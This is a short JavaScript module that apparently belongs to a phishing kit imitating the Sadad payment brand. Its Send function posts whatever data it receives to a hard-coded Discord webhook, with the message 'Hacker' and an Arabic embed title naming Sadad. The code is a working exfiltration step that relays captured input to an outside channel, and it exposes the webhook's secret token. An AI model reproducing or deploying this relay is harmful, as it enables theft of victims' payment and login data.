import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321908983807610881/tP005At80kUti-RfKJvTRpZG4LhoY20XHFUMYGm24pX1e9_PYecaRoc3niLSaZEC9St4",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
